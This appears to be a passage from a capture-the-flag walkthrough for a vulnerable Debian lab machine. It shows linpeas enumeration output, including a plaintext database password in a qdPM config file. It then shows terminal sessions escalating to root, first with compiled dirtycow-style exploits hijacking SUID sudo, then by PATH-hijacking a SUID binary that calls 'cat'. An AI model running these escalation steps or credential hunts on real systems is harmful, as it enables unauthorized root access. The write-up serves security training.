+╔══════════╣ Searching passwords in config PHP files
+/var/www/html/core/cache/qdPM/prod/config/config_autoload.yml.php:  'passwordhash' => '/var/www/html/core/lib/PasswordHash.php',                                                             
+/var/www/html/core/cache/qdPM/prod/config/config_autoload.yml.php:  'restorepasswordform' => '/var/www/html/core/lib/form/RestorePasswordForm.php',
+/var/www/html/core/cache/qdPM/prod/config/config_databases.yml.php:  'password' => 'UcVQCMQk2STVeS6J',
+/var/www/html/core/cache/qdPM/prod/config/config_factories.yml.php:      'password' => NULL,
+/var/www/html/core/cache/qdPM/prod/config/modules_dashboard_config_security.yml.php:  'restorepassword' => 
+/var/www/html/core/cache/qdPM/prod/config/modules_login_config_security.yml.php:  'restorepassword' => 
+/var/www/html/core/cache/qdPM/prod/config/modules_users_config_security.yml.php:  'restorepassword' => 
+/var/www/html/install/modules/database_config.php:    <td>DB password:</td>
+/var/www/html/install/modules/qdpm_config.php:<input type="hidden" name="db_password" value="<?php echo trim(addslashes($_POST['db_password']))?>">
+/var/www/html/install/modules/qdpm_config.php:    <td><input type="password" name="administrator_password" ></td>
+/var/www/html/install/modules/qdpm_config.php:    <td>Password:<font color="red">*</font></td>
+
+╔══════════╣ Searching *password* or *credential* files in home (limit 70)
+/etc/pam.d/common-password                                                                                                                                                                   
+/usr/bin/systemd-ask-password
+/usr/bin/systemd-tty-ask-password-agent
+/usr/lib/git-core/git-credential
+/usr/lib/git-core/git-credential-cache
+/usr/lib/git-core/git-credential-cache--daemon
+/usr/lib/git-core/git-credential-store
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/lib/grub/i386-pc/password.mod
+/usr/lib/grub/i386-pc/password_pbkdf2.mod
+/usr/lib/mysql/plugin/component_validate_password.so
+/usr/lib/mysql/plugin/validate_password.so
+/usr/lib/ruby/2.7.0/bundler/uri_credentials_filter.rb
+/usr/lib/systemd/systemd-reply-password
+/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
+/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
+/usr/lib/systemd/system/systemd-ask-password-console.path
+/usr/lib/systemd/system/systemd-ask-password-console.service
+/usr/lib/systemd/system/systemd-ask-password-wall.path
+/usr/lib/systemd/system/systemd-ask-password-wall.service
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/share/doc/apache2-doc/manual/de/misc/password_encryptions.html
+/usr/share/doc/apache2-doc/manual/en/misc/password_encryptions.html
+/usr/share/doc/apache2-doc/manual/es/misc/password_encryptions.html
+/usr/share/doc/apache2-doc/manual/fr/misc/password_encryptions.html
+/usr/share/doc/apache2-doc/manual/ja/misc/password_encryptions.html
+/usr/share/doc/apache2-doc/manual/ko/misc/password_encryptions.html
+/usr/share/doc/apache2-doc/manual/pt-br/misc/password_encryptions.html
+/usr/share/doc/apache2-doc/manual/ru/misc/password_encryptions.html
+/usr/share/doc/apache2-doc/manual/tr/misc/password_encryptions.html
+/usr/share/doc/apache2-doc/manual/zh-cn/misc/password_encryptions.html
+/usr/share/doc/git/contrib/credential
+/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
+/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
+/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc.perl
+/usr/share/doc/git/contrib/credential/netrc/t-git-credential-netrc.sh
+/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
+/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
+/usr/share/go-1.15/src/syscall/creds_test.go
+/usr/share/man/man1/git-credential.1.gz
+/usr/share/man/man1/git-credential-cache.1.gz
+/usr/share/man/man1/git-credential-cache--daemon.1.gz
+/usr/share/man/man1/git-credential-store.1.gz
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/share/man/man7/gitcredentials.7.gz
+/usr/share/man/man8/systemd-ask-password-console.path.8.gz
+/usr/share/man/man8/systemd-ask-password-console.service.8.gz
+/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
+/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/share/pam/common-password.md5sums
+/var/cache/debconf/passwords.dat
+/var/lib/pam/password
+
+╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
+                                                                                                                                                                                             
+╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
+                                                                                                                                                                                             
+╔══════════╣ Searching passwords inside logs (limit 70)
+/var/log/dpkg.log:2021-09-25 10:08:40 configure base-passwd:amd64 3.5.51 3.5.51                                                                                                              
+/var/log/dpkg.log:2021-09-25 10:08:40 install base-passwd:amd64 <none> 3.5.51
+/var/log/dpkg.log:2021-09-25 10:08:40 status half-configured base-passwd:amd64 3.5.51
+/var/log/dpkg.log:2021-09-25 10:08:40 status half-installed base-passwd:amd64 3.5.51
+/var/log/dpkg.log:2021-09-25 10:08:40 status installed base-passwd:amd64 3.5.51
+/var/log/dpkg.log:2021-09-25 10:08:40 status unpacked base-passwd:amd64 3.5.51
+/var/log/dpkg.log:2021-09-25 10:08:47 status half-configured base-passwd:amd64 3.5.51
+/var/log/dpkg.log:2021-09-25 10:08:47 status half-installed base-passwd:amd64 3.5.51
+/var/log/dpkg.log:2021-09-25 10:08:47 status unpacked base-passwd:amd64 3.5.51
+/var/log/dpkg.log:2021-09-25 10:08:47 upgrade base-passwd:amd64 3.5.51 3.5.51
+/var/log/dpkg.log:2021-09-25 10:08:51 install passwd:amd64 <none> 1:4.8.1-1
+/var/log/dpkg.log:2021-09-25 10:08:51 status half-installed passwd:amd64 1:4.8.1-1
+/var/log/dpkg.log:2021-09-25 10:08:51 status unpacked passwd:amd64 1:4.8.1-1
+/var/log/dpkg.log:2021-09-25 10:08:54 configure base-passwd:amd64 3.5.51 <none>
+/var/log/dpkg.log:2021-09-25 10:08:54 status half-configured base-passwd:amd64 3.5.51
+/var/log/dpkg.log:2021-09-25 10:08:54 status installed base-passwd:amd64 3.5.51
+/var/log/dpkg.log:2021-09-25 10:08:54 status unpacked base-passwd:amd64 3.5.51
+/var/log/dpkg.log:2021-09-25 10:08:56 configure passwd:amd64 1:4.8.1-1 <none>
+/var/log/dpkg.log:2021-09-25 10:08:56 status half-configured passwd:amd64 1:4.8.1-1
+/var/log/dpkg.log:2021-09-25 10:08:56 status installed passwd:amd64 1:4.8.1-1
+/var/log/dpkg.log:2021-09-25 10:08:56 status unpacked passwd:amd64 1:4.8.1-1
+/var/log/installer/status:Description: Set up users and passwords
+
+╔══════════╣ Checking all env variables in /proc/*/environ removing duplicates and filtering out useless env vars
+HOME=/home/dexter                                                                                                                                                                            
+HOME=/home/dexter/
+LANG=en_US.UTF-8
+LOGNAME=dexter
+MOTD_SHOWN=pam
+NOTIFY_SOCKET=/run/systemd/notify
+OLDPWD=/home/dexter/
+PWD=/home
+SHELL=/bin/bash
+SHLVL=0
+SSH_CLIENT=10.0.2.4 45722 22
+SSH_CONNECTION=10.0.2.4 45722 10.0.2.8 22
+SSH_TTY=/dev/pts/1
+TERM=xterm-256color
+USER=dexter
+_=/usr/bin/sh
+XDG_RUNTIME_DIR=/run/user/1001
+
+
+                                ╔════════════════╗
+════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                                                                                           
+                                ╚════════════════╝                                                                                                                                           
+Regexes to search for API keys aren't activated, use param '-r' 
+
+
+
+
+Linpeas says that the sistem is probably vulnerable to dirtycow. So download the exploit, do the config, and run the exploit:
+
+
+travis@debian:/home/travis$ chmod +x compile.sh 
+travis@debian:/home/travis$ ./compile.sh 
+travis@debian:/home/travis$ ls
+compile.sh  dpipe.sh  exploit-1  exploit-1.c  exploit-2  exploit-2.c  go  user.txt
+travis@debian:/home/travis$ ./exploit-1
+Backing up /etc/passwd to /tmp/passwd.bak ...
+Setting root password to "piped"...
+system() function call seems to have failed :(
+travis@debian:/home/travis$ find / -perm -4000 2>/dev/null
+/opt/get_access
+/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/chsh
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+travis@debian:/home/travis$ ./exploit-2 /usr/bin/sudo
+[+] hijacking suid binary..
+[+] dropping suid shell..
+[+] restoring suid binary..
+[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data),1002(travis)
+# cd /root
+# ls
+root.txt  system.info
+# cat root.txt
+ICA{Next_Generation_Self_Renewable_Genetics}
+# 
+
+
+
+
+Method 2:
+
+
+dexter@debian:/tmp/Linux_LPE_eBPF_CVE-2021-3490-main$ find / -perm -4000 2>/dev/null
+/opt/get_access
+/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/chsh
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/tmp/sh
+dexter@debian:/tmp/Linux_LPE_eBPF_CVE-2021-3490-main$ ls /opt/get_access 
+/opt/get_access
+dexter@debian:/tmp/Linux_LPE_eBPF_CVE-2021-3490-main$ 
+
+
+dexter@debian:/tmp/Linux_LPE_eBPF_CVE-2021-3490-main$ strings /opt/get_access 
+/lib64/ld-linux-x86-64.so.2
+setuid
+socket
+puts
+system
+__cxa_finalize
+setgid
+__libc_start_main
+libc.so.6
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u/UH
+[]A\A]A^A_
+cat /root/system.info
+Could not create socket to access to the system.
+All services are disabled. Accessing to the system is allowed only within working hours.
+;*3$"
+GCC: (Debian 10.2.1-6) 10.2.1 20210110
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.0
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+get_access.c
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+puts@GLIBC_2.2.5
+_edata
+system@GLIBC_2.2.5
+__libc_start_main@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+setgid@GLIBC_2.2.5
+__TMC_END__
+_ITM_registerTMCloneTable
+setuid@GLIBC_2.2.5
+__cxa_finalize@GLIBC_2.2.5
+socket@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.gnu.build-id
+.note.ABI-tag
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+
+.comment
+dexter@debian:/tmp/Linux_LPE_eBPF_CVE-2021-3490-main$ echo ‘/usr/bin/bash’ >> /tmp/cat
+dexter@debian:/tmp/Linux_LPE_eBPF_CVE-2021-3490-main$ export PATH=/tmp:$PATH
+dexter@debian:/tmp/Linux_LPE_eBPF_CVE-2021-3490-main$ chmod +x /tmp/cat
+dexter@debian:/tmp/Linux_LPE_eBPF_CVE-2021-3490-main$ echo $PATH
+/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+dexter@debian:/tmp/Linux_LPE_eBPF_CVE-2021-3490-main$ cd /opt
+dexter@debian:/opt$ ./get_access 
+
+
+
+we highjack the path and we get root
+
+
+
+
+
